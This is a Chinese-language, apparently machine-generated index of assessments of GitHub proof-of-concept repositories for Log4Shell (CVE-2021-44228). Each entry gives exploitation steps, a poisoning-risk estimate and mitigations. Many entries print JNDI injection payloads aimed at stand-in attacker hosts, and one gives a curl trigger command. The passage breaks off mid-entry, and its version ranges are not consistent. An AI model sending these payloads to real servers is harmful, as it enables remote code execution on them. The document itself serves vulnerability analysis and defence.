
---

## POC #15

**来源**: [CVE-2021-44228-Super-Binary_cve-2021-44228.md](../2021/CVE-2021-44228-Super-Binary_cve-2021-44228.md)

# CVE-2021-44228

> 📦 该CVE有 **41** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-44228-0xInfection_LogMePwn.md](../2021/CVE-2021-44228-0xInfection_LogMePwn.md)

## CVE-2021-44228 - Apache Log4j2 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 Log4j2，且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的远程代码执行漏洞，存在于 Apache Log4j2 中。攻击者可以通过构造包含 JNDI 查找的恶意日志消息，从而在目标服务器上执行任意代码。漏洞利用方式如下：

1.  **漏洞原理：** Log4j2 允许在日志消息中使用 JNDI 查找，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 尝试解析这些查找时，它会连接到指定的 JNDI 服务器（例如 LDAP），并检索 Java 对象。如果攻击者可以控制日志消息的内容，他们就可以让 Log4j2 连接到恶意的 JNDI 服务器，该服务器会返回包含恶意代码的 Java 对象，Log4j2 反序列化这个对象从而导致任意代码执行。

2.  **利用方式：**
    *   攻击者需要找到一个途径，可以将恶意 JNDI 查找字符串注入到应用程序的日志消息中。这可能通过 HTTP 请求头、POST 请求参数、Websocket 消息等实现。
    *   攻击者控制的 JNDI 服务器（例如 LDAP 服务器）需要返回一个包含恶意代码的 Java 对象。这通常通过一个恶意的 Java 类来实现，该类在加载时执行任意代码。

3.  **漏洞代码评估：** 提供的漏洞利用代码看起来像一个通用的漏洞扫描器，可以扫描各种协议，并允许自定义 payload。它本身不包含直接的攻击载荷,但是如果扫描器被用于发送恶意 JNDI 查找字符串，则它就可以被用来触发 CVE-2021-44228。

4.  **投毒风险分析：** 虽然提供的CHANGELOG和LICENSE文件看起来无害，但仓库中其他未提供代码的可能性也存在。扫描器本身允许自定义payload，可能包含恶意软件，用户应该小心使用，因此存在一定的投毒风险（估计为 10%）。这个百分比考虑了代码扫描器可能被用来传播恶意 payload的可能性，即使其核心功能并非恶意。

5.  **缓解措施：**
    *   升级 Log4j2 到 >=2.17.1 版本。
    *   禁用 JNDI 查找功能（如果不需要）。
    *   设置 `log4j2.formatMsgNoLookups=true` 属性。


**项目地址:** [0xInfection/LogMePwn](https://github.com/0xInfection/LogMePwn)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #2

**来源**: [CVE-2021-44228-0xsyr0_Log4Shell.md](../2021/CVE-2021-44228-0xsyr0_Log4Shell.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 <= version < 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j2版本，且允许攻击者控制日志消息或日志消息参数。需要目标服务器开启JNDI功能。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是Apache Log4j2中的一个严重漏洞，允许未经身份验证的远程代码执行。攻击者可以通过发送特制的日志请求，利用Log4j2的JNDI功能来执行任意代码。\n\n**漏洞利用方式：**\n\n1.  攻击者向使用存在漏洞的Log4j2组件的应用程序发送包含恶意JNDI查找字符串的请求。例如： `${jndi:ldap://attacker.com/evil}`\n2.  Log4j2在记录日志时，会解析该JNDI字符串，并尝试通过LDAP协议连接到攻击者控制的服务器（attacker.com）。\n3.  攻击者的LDAP服务器返回一个包含Java对象的引用。\n4.  Log4j2尝试加载并实例化该Java对象，从而导致攻击者控制的代码在服务器上执行。\n\n**有效性：** 根据漏洞库信息和搜索结果，该漏洞的POC代码是有效的。该漏洞已被广泛利用，并且互联网上存在大量的POC和利用工具。\n\n**投毒风险：**\n查看了提供的“漏洞利用代码”仓库的内容列表，主要包含以下信息:\n*   Advisory.md：提供漏洞相关的建议和缓解措施的链接。\n*   Exploitation.md：提供漏洞利用相关的链接，例如渗透测试指南和JNDI注入工具。\n*   Honeypots.md：提供蜜罐相关的链接。\n*   IOCs-Callback-Domains-IP-Addresses.md：提供IOC（Indicator of Compromise）和回调URL/IP地址的链接。\n*   Malware-Reports.md：提供恶意软件报告的链接。\n*   Mitigations-Fixes.md：提供缓解和修复措施的链接。\n*   Payloads-Obfuscation-WAF-Bypass.md：提供payload、混淆和WAF绕过相关的链接。\n\n总体而言，这个仓库主要是一个资源链接的集合，提供了关于CVE-2021-44228（Log4Shell）的各种信息，包括漏洞建议、利用方法、IOC、缓解措施和payload。\n\n其中`Exploitation.md`文件中链接的`JNDI-Injection-Exploit`、`JNDI-Exploit-Kit`和`marshalsec`等工具本身就是漏洞利用工具，如果用户下载并使用这些工具，可能会面临安全风险，例如被植入后门或恶意代码，或者被用于非法用途。但是这些工具本身是为了复现和验证漏洞使用的，并非作者投毒。\n仓库本身提供的信息比较杂乱，需要使用者具备一定的安全知识才能正确评估和使用。存在一定的误导性，有可能被不具备安全知识的人误用，或者被用于恶意目的，因此评估投毒风险为10%。

**项目地址:** [0xsyr0/Log4Shell](https://github.com/0xsyr0/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #3

**来源**: [CVE-2021-44228-Alan-coder-eng_log4j-cve-2021-44228-.md](../2021/CVE-2021-44228-Alan-coder-eng_log4j-cve-2021-44228-.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 至 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 log4j-core 并且启用了消息查找替换功能。攻击者需要能够控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞。攻击者可以通过在日志消息中插入恶意的 JNDI 查找字符串，利用 JNDI 功能从远程 LDAP 服务器加载和执行任意代码。 

**利用方式：**

1.  攻击者发送包含恶意 JNDI 查找字符串的请求，例如 `${jndi:ldap://attacker.com/evil}`，到目标应用程序。
2.  如果目标应用程序使用 Log4j2 记录该请求，Log4j2 将尝试解析该 JNDI 字符串。
3.  Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 `attacker.com`。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，导致远程代码执行。

**有效性：**

提供的 POC 代码（Vulhub 环境配置）有效，用于搭建一个可重现 Log4Shell 漏洞的环境。它通过 Docker-Compose 部署一个包含漏洞的 Apache Solr 实例，方便研究人员进行漏洞复现和分析。

**投毒风险：**

该仓库本身主要提供的是漏洞复现环境的配置，投毒风险较低。但是，使用任何第三方代码库或环境时，都需要谨慎评估潜在的风险。这里存在一定风险，因为攻击者可能篡改该仓库，在 LDAP 服务器返回的恶意 Java 类中植入恶意代码，使得利用漏洞时执行预期之外的操作。 因此评判投毒风险为10%，主要为潜在的供应链攻击风险。

**项目地址:** [Alan-coder-eng/log4j-cve-2021-44228-](https://github.com/Alan-coder-eng/log4j-cve-2021-44228-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #4

**来源**: [CVE-2021-44228-B1ack4sh_Blackash-CVE-2021-44228.md](../2021/CVE-2021-44228-B1ack4sh_Blackash-CVE-2021-44228.md)

## CVE-2021-44228 - Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j 2

**危害等级:** 极高危，可导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.14.1

**利用条件:** 应用程序使用Log4j 2记录不受信任的输入，且未进行修复或缓解。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是Apache Log4j 2中的一个远程代码执行漏洞。攻击者可以通过构造包含JNDI查找的恶意字符串，当Log4j 2记录该字符串时，会触发JNDI查找，从而从攻击者控制的LDAP服务器加载并执行恶意Java类。

**有效性：**
提供的POC代码有效。它展示了如何通过在HTTP请求头中注入`${jndi:ldap://evil.com/exploit}`这样的payload来触发漏洞。当应用程序记录User-Agent头时，Log4j 2会尝试解析该字符串，执行JNDI查找，并从evil.com加载恶意代码。

**投毒风险：**
分析提供的README.md文件，投毒风险较低，约为10%。主要风险在于以下几点：
* **依赖性风险：** 任何开源项目都存在依赖性风险。如果恶意作者控制了项目依赖的某个组件，则可能通过供应链攻击进行投毒。
* **人为因素：** 尽管README.md本身没有发现直接的恶意代码，但用户在使用过程中可能会受到误导，例如，将测试用的恶意LDAP服务器配置错误，导致意外的攻击或数据泄露。

**漏洞利用方式：**
1.  **攻击者构造恶意Payload：** 攻击者构造一个包含JNDI查找的payload，例如`${jndi:ldap://attacker.com/a}`。
2.  **注入Payload：** 攻击者将payload注入到应用程序可以记录的任何输入点，例如HTTP请求头（User-Agent、X-Forwarded-For等）、POST请求参数、WebSocket消息等。
3.  **触发日志记录：** 应用程序使用Log4j 2记录包含恶意payload的输入。
4.  **JNDI查找：** Log4j 2解析payload，执行JNDI查找，向attacker.com发起LDAP请求。
5.  **加载恶意代码：** 攻击者的LDAP服务器返回一个包含恶意Java类的响应。
6.  **远程代码执行：** Log4j 2加载并执行该Java类，导致远程代码执行。

**缓解措施：**
*   升级Log4j 2到最新版本 (>= 2.17.1)。
*   从JAR文件中删除`JndiLookup.class`。
*   设置系统属性`log4j2.formatMsgNoLookups=true`来禁用消息查找。
*   使用防火墙或出口ACL阻止出站LDAP/RMI流量。
*   在WAF/IDS规则中阻止`${jndi:` payload。

**项目地址:** [B1ack4sh/Blackash-CVE-2021-44228](https://github.com/B1ack4sh/Blackash-CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #5

**来源**: [CVE-2021-44228-Carlos-Mesquita_TPASLog4ShellPoC.md](../2021/CVE-2021-44228-Carlos-Mesquita_TPASLog4ShellPoC.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标系统使用受影响版本的 Log4j2，且允许出站网络连接到攻击者的 LDAP/HTTP 服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-44228 (Log4Shell) 是一个存在于 Apache Log4j2 中的远程代码执行漏洞。攻击者可以通过构造特殊的日志消息，利用 JNDI 注入来执行任意代码。 

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的PoC代码有效。搜索结果表明该漏洞是真实存在的，并且有许多利用实例。

**投毒风险：**
分析提供的PoC代码，投毒风险很低。 
*   `LICENSE`: MIT许可，标准开源许可。 
*   `README.md`: 提供了PoC的详细信息，包括所需环境，操作步骤和WAF绕过方式等。 
*   `docker-compose.yaml`: 定义了frontend(React SPA)和backend(Spring Boot)两个服务, 其中backend使用了存在漏洞的Log4j2。 
*   `init.sh`: 这个脚本用于在攻击者机器上设置攻击环境。它编译JNDI利用所需的Java类，启动一个HTTP服务器来提供这些类，并启动一个LDAP服务器以响应JNDI查询。这个脚本是攻击的核心组成部分，但它本身的目的就是为了演示漏洞利用，不属于恶意投毒。它确实会下载编译好的文件到攻击者机器上，但这是漏洞利用的正常流程,本身不构成投毒。 但使用未经审核的脚本始终存在一定的风险，所以给了1%的风险.

**利用方式：**
1.  攻击者向目标系统发送包含恶意 JNDI 注入字符串的请求。该字符串形如`${jndi:ldap://attacker_host:ldap_port/Exploit}`。
2.  目标系统使用 Log4j2 记录该请求。由于存在漏洞，Log4j2 会解析 JNDI 字符串，并尝试通过 LDAP 协议连接到攻击者的服务器。
3.  攻击者的 LDAP 服务器返回一个指向 HTTP 服务器的响应，指示目标系统下载并执行一个 Java 类。
4.  目标系统下载并执行该 Java 类，从而实现远程代码执行。

**缓解措施：**
*   升级到 Log4j2 的安全版本 (>= 2.17.0)。
*   如果无法升级，可以设置 `log4j2.formatMsgNoLookups=true` 阻止 JNDI 查找。
*   使用 Web 应用防火墙 (WAF) 检测和阻止恶意的 JNDI 注入字符串。

**项目地址:** [Carlos-Mesquita/TPASLog4ShellPoC](https://github.com/Carlos-Mesquita/TPASLog4ShellPoC)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #6

**来源**: [CVE-2021-44228-Fauzan-Aldi_Log4j-_Vulnerability.md](../2021/CVE-2021-44228-Fauzan-Aldi_Log4j-_Vulnerability.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可导致完全服务器接管

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标应用使用了受影响版本的Log4j2，并且允许通过用户可控的输入来记录日志。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也称为Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过向服务器发送特制的字符串，该字符串包含JNDI查找，从而利用此漏洞。当Log4j2尝试记录此字符串时，它会执行JNDI查找，导致服务器从攻击者控制的LDAP服务器下载并执行恶意代码。 

**漏洞利用方式：**

1.  攻击者向目标系统发送包含恶意JNDI查找的请求。例如： `${jndi:ldap://attacker.com/evil}` 
2.  如果目标系统使用受影响的Log4j2版本记录此请求，Log4j2将尝试执行JNDI查找。 
3.  Log4j2连接到攻击者控制的LDAP服务器(`attacker.com`)。 
4.  LDAP服务器返回一个包含恶意Java类的URL。 
5.  Log4j2从该URL下载并执行恶意Java类，导致远程代码执行。 

**POC有效性：**

从提供的`pom.xml`文件可以看出，POC代码使用了`log4j-core`和`log4j-api`的2.14.1版本，该版本受到CVE-2021-44228漏洞的影响。因此，如果部署包含此Log4j2版本的Web应用，则攻击者可以通过发送恶意payload触发漏洞。`forgotpass.java`文件展示了如何从request中获取参数，并将其拼接到输出中，这可能是触发漏洞的点，攻击者可以在username参数中插入恶意payload.

**投毒风险：**

分析提供的代码，`forgotpass.java`看似存在XSS漏洞，该文件只是简单地将用户输入（username）插入到HTML的JavaScript代码中，使其能弹出一个prompt窗口，之后跳转到主页。没有发现明显的用于进行恶意利用的代码，如反弹shell或进行其他类型的远程控制操作。 `log4j.java` 是一个Logger类，没有实际逻辑。 总体而言，仓库中存在隐藏的投毒代码的可能性较低，估计在10%左右。主要考虑到作者可能在LDAP服务器上部署恶意java文件，从而进行投毒。需要更深入的分析才能确定是否存在更隐蔽的投毒行为。

**项目地址:** [Fauzan-Aldi/Log4j-_Vulnerability](https://github.com/Fauzan-Aldi/Log4j-_Vulnerability)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #7

**来源**: [CVE-2021-44228-KamalideenAK_Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device.md](../2021/CVE-2021-44228-KamalideenAK_Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device.md)

## CVE-2021-44228 Apache Log4j2 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，并且允许攻击者控制Log4j2的日志消息或日志消息参数

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个严重的远程代码执行漏洞，存在于Apache Log4j2 2.0-beta9到2.15.0版本中（不包括安全版本2.12.2、2.12.3和2.3.1）。

**有效性：**
漏洞库信息明确指出，在特定版本的Log4j2中，JNDI功能未对攻击者控制的LDAP和其他JNDI相关端点提供保护。如果攻击者可以控制日志消息或日志消息参数，并且启用了消息查找替换，则可以执行从LDAP服务器加载的任意代码。因此，可以判定漏洞利用代码有效。

**投毒风险：**
提供的漏洞利用代码只是一个GNU GPL v2许可协议的文本文件，不是漏洞利用的payload或者脚本，不包含任何可执行的代码，因此，不存在投毒代码。投毒风险为0%。

**利用方式：**
该漏洞的利用方式是，攻击者构造包含JNDI查找的恶意字符串，例如`${jndi:ldap://attacker.com/evil}`。当Log4j2记录此字符串时，它会尝试解析JNDI查找。这将导致Log4j2通过LDAP协议连接到攻击者控制的服务器`attacker.com`。攻击者可以在其LDAP服务器上托管一个恶意Java类，当Log4j2连接到LDAP服务器时，该类将被下载并执行，从而导致远程代码执行。需要注意的是，从Log4j 2.15.0开始，此行为已默认禁用，并在版本2.16.0中完全删除（以及2.12.2、2.12.3和2.3.1）。


**项目地址:** [KamalideenAK/Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device](https://github.com/KamalideenAK/Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #8

**来源**: [CVE-2021-44228-LucasPDiniz_CVE-2021-44228.md](../2021/CVE-2021-44228-LucasPDiniz_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标系统使用了受影响版本的Log4j2，且允许JNDI查找

**POC 可用性:** 是

**投毒风险:** 2%

## 详情

CVE-2021-44228 存在于 Apache Log4j2 中，利用了 JNDI 注入漏洞，攻击者通过控制日志消息或日志消息参数，可以执行从 LDAP 服务器加载的任意代码。利用方式如下：

1.  **构造恶意 JNDI 注入 Payload：** 攻击者构造包含 JNDI 查找的恶意字符串，例如 `${jndi:ldap://attacker.com/evil}`。
2.  **触发 Log4j2 记录 Payload：** 将恶意 Payload 注入到应用程序的日志消息中。这可以通过多种方式实现，例如通过 HTTP 请求头、POST 参数、用户输入等。
3.  **Log4j2 解析 Payload 并执行 JNDI 查找：** 当 Log4j2 记录包含恶意 Payload 的日志消息时，它会尝试解析 JNDI 查找。
4.  **连接到恶意 LDAP 服务器：**  Log4j2 会连接到攻击者控制的 LDAP 服务器（attacker.com）。
5.  **执行任意代码：** 恶意 LDAP 服务器会返回一个包含恶意 Java 类的响应，Log4j2 会加载并执行该类，从而导致远程代码执行。

**投毒风险分析：**

尽管该存储库提供了有价值的 PoC 和利用信息，但仍然存在作者投毒代码的微小风险。例如，LDAP 服务器响应中包含的恶意 Java 类可能包含后门，或在其他位置下载并执行恶意代码。为了将风险降至最低，应彻底审查提供的任何代码，并仅从受信任的来源下载所需的工具。

**项目地址:** [LucasPDiniz/CVE-2021-44228](https://github.com/LucasPDiniz/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #9

**来源**: [CVE-2021-44228-Mintimate_log4j2-bugmaker.md](../2021/CVE-2021-44228-Mintimate_log4j2-bugmaker.md)

## CVE-2021-44228 Log4Shell 漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行，系统完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，并且允许记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是 Apache Log4j2 中的一个远程代码执行漏洞。攻击者可以通过发送包含特定格式字符串（例如 `${jndi:ldap://attacker.com/a}`）的请求，如果该字符串被 Log4j2 记录，则 Log4j2 会尝试通过 JNDI（Java Naming and Directory Interface）去指定的LDAP服务器上查找并执行相应的代码。该演示项目使用了存在漏洞的 Log4j 2.14.1 版本，并提供了多种攻击方法，包括User-Agent头注入和查询参数注入。

**有效性：** 提供的POC代码有效，可以复现CVE-2021-44228漏洞。

**投毒风险：** 该项目主要用于演示漏洞，在`LICENSE`文件中明确声明“This project is intended for educational and security research purposes only. It contains intentionally vulnerable code (Log4j 2.14.1) to demonstrate the CVE-2021-44228 (Log4Shell) vulnerability. DO NOT use this code in production environments.”。因此，可以判断作者主观上没有投毒意图。但是仍然存在一定风险，因为用户在使用该项目时，可能会不小心将其部署到生产环境中，造成安全风险。因此投毒风险评估为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者向目标应用程序发送包含恶意JNDI查找表达式的请求。例如，通过User-Agent头或者查询参数。
2.  **JNDI注入：** 当Log4j2记录包含该表达式的日志时，它会尝试解析该表达式。
3.  **远程代码执行：** Log4j2会通过JNDI向攻击者控制的LDAP服务器请求Java对象。攻击者的LDAP服务器返回一个包含恶意代码的Java对象。
4.  **代码执行：** Log4j2加载并执行该Java对象中的恶意代码，从而导致远程代码执行。

**项目地址:** [Mintimate/log4j2-bugmaker](https://github.com/Mintimate/log4j2-bugmaker)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #10

**来源**: [CVE-2021-44228-OtisSymbos_CVE-2021-44228-Log4Shell-.md](../2021/CVE-2021-44228-OtisSymbos_CVE-2021-44228-Log4Shell-.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用存在漏洞的Log4j2版本，且允许消息查找替换。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2021-44228（Log4Shell）是Apache Log4j2中的一个严重漏洞，允许未经身份验证的远程代码执行。攻击者可以构造特殊的日志消息，其中包含JNDI查找，指向恶意LDAP或其他JNDI服务。当Log4j2处理这些日志消息时，它会尝试从攻击者控制的服务器下载并执行任意代码。 

提供的脚本 `log4j_remediation` 试图通过下载并替换Log4j2库文件来进行修复，但是从修复的角度来看,这个脚本存在严重的投毒风险，因为：

1. **URL 的变量名不规范**：`LOG4J_DOWNLOAD_URL` 变量中的 `2.x.y` 存在被攻击者修改的风险，攻击者可以劫持链接，使用恶意的Log4j2 jar 包，造成二次污染。
2. **覆盖现有的 Log4j JAR 文件**:  脚本直接复制下载的新 JAR 文件到应用程序目录，这可能会破坏应用程序的依赖关系，尤其是在不同版本的 Log4j 之间存在不兼容的情况下。
3. **未进行校验**:  脚本没有对下载的压缩包或 JAR 文件进行任何完整性校验（如哈希校验），无法确保下载的文件没有被篡改。
4. **依赖外部源**: 脚本依赖于外部 Apache 官方服务器下载 Log4j，如果该服务器被攻陷，则存在极高的投毒风险。
5. **版本不确定**: 脚本中的版本号 `2.x.y` 是一个占位符，这意味着脚本实际上没有指定要下载的具体 Log4j 版本，可能导致下载到不安全或不兼容的版本。


 **利用方式：** 

1.  攻击者找到任何会记录用户可控输入的Log4j2应用程序。
2.  攻击者在输入中插入恶意的JNDI查找字符串，例如 `${jndi:ldap://attacker.com/evil}`。
3.  当Log4j2记录包含此字符串的日志消息时，它会向`attacker.com`发起LDAP请求。
4.  `attacker.com`的LDAP服务器返回一个包含恶意Java类的响应。
5.  Log4j2加载并执行该恶意Java类，从而导致远程代码执行。

根据漏洞库信息，搜索引擎结果以及提供的漏洞利用代码进行综合分析， 漏洞利用的有效性高，投毒风险极高。

**项目地址:** [OtisSymbos/CVE-2021-44228-Log4Shell-](https://github.com/OtisSymbos/CVE-2021-44228-Log4Shell-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #11

**来源**: [CVE-2021-44228-PCMKUIT_CVE-2021-44228---Log4Shell-Analysis.md](../2021/CVE-2021-44228-PCMKUIT_CVE-2021-44228---Log4Shell-Analysis.md)

## CVE-2021-44228 - Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.14.1

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个关键漏洞，它允许未经身份验证的远程代码执行。攻击者可以通过将恶意 JNDI 查找字符串注入到 Log4j2 记录的日志消息中来利用此漏洞。当 Log4j2 尝试解析并记录包含恶意 JNDI 查找的日志消息时，它会联系攻击者控制的 LDAP 或 RMI 服务器，并执行服务器返回的恶意代码。

**漏洞利用方式：**

1.  **攻击者构造恶意请求：** 攻击者将包含特定格式的恶意字符串（例如 `${jndi:ldap://attacker.com/evil}`）注入到应用程序可以记录的任何输入字段中，例如 HTTP 请求头、POST 数据、Web 表单等。
2.  **应用程序记录日志：** 如果应用程序使用受影响版本的 Log4j2 记录包含恶意字符串的输入，Log4j2 将尝试解析该字符串。
3.  **JNDI 查找触发：** Log4j2 发现 `${jndi:...}` 模式，触发 JNDI 查找。
4.  **连接恶意服务器：** Log4j2 使用指定的协议（例如 LDAP、RMI）连接到攻击者控制的服务器 (attacker.com)。
5.  **执行恶意代码：** 攻击者的服务器返回包含恶意 Java 对象的响应。Log4j2 反序列化该对象，导致在目标服务器上执行任意代码。

**有效性：**

提供的POC代码（技术分析文档）描述了该漏洞的原理，受影响版本以及利用过程，可以辅助构建PoC。漏洞利用的有效性取决于目标系统是否使用了受影响的Log4j2版本，并且是否允许出站网络连接到攻击者的JNDI服务器。由于 Log4Shell 在野外被广泛利用，因此认为提供的分析是基于真实可利用的漏洞的。

**投毒风险：**

提供的代码主要为技术分析文档，本身不包含可直接执行的恶意代码。但是，任何代码仓库都存在一定程度的投毒风险。在这种情况下，如果攻击者成功篡改了仓库中的分析文档，他们可能会插入误导性信息或隐藏的恶意链接，从而诱导用户下载或执行恶意软件。风险评估为10%，因仓库主要为分析文档，直接嵌入恶意代码可能性较低。

**项目地址:** [PCMKUIT/CVE-2021-44228---Log4Shell-Analysis](https://github.com/PCMKUIT/CVE-2021-44228---Log4Shell-Analysis)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #12

**来源**: [CVE-2021-44228-SerpilRivas_log4shell-homework9.md](../2021/CVE-2021-44228-SerpilRivas_log4shell-homework9.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)

**利用条件:** 目标应用程序使用受影响版本的 Log4j2，且允许记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228，也被称为 Log4Shell，是一个存在于 Apache Log4j2 中的严重漏洞。攻击者可以通过发送特制的字符串，其中包含 JNDI 查找，利用此漏洞执行任意代码。当 Log4j2 尝试记录这些字符串时，它会通过 JNDI 查找连接到攻击者控制的 LDAP 或其他 JNDI 服务，并执行恶意代码。

**漏洞利用方式：**

1.  攻击者发送包含`${jndi:<协议>://<攻击者服务器>/<资源>}`的恶意请求到目标系统。`${jndi}`是触发漏洞的关键部分，它指示 Log4j2 执行 JNDI 查找。
2.  目标系统使用 Log4j2 记录该请求。
3.  Log4j2 解析该字符串并尝试连接到攻击者指定的 JNDI 服务器（例如，LDAP）。
4.  JNDI 服务器返回恶意代码（例如，Java class 文件）。
5.  Log4j2 加载并执行该恶意代码，导致远程代码执行。

**POC有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞非常有效，并被广泛利用。提供的 Dockerfile 和 `docker-compose.yml` 文件用于构建一个包含易受攻击的 Log4j2 版本的应用程序。`ldap_server.py` 模拟了一个恶意的 LDAP 服务器，用于提供攻击载荷。使用`curl http://localhost:8080?input=${jndi:ldap://localhost:8000/Exploit}`命令验证漏洞利用过程。

**投毒风险：**

分析提供的代码，投毒风险较低，约为 5%。主要依据如下：

*   `ldap_server.py` 仅用于模拟攻击，本身不包含任何恶意代码，只返回“Exploit payload simulated.”字符串。
*   Dockerfile 构建的镜像是使用受漏洞影响的Log4j2，目的是为了验证漏洞，不是为了投毒。
*   `pom.xml` 文件指定了 Log4j2 的版本为 2.17.1, 此版本已经修复了漏洞，但README.md文件中提到使用了存在漏洞的2.14.1版本，存在描述不一致，且依赖版本管理不严谨
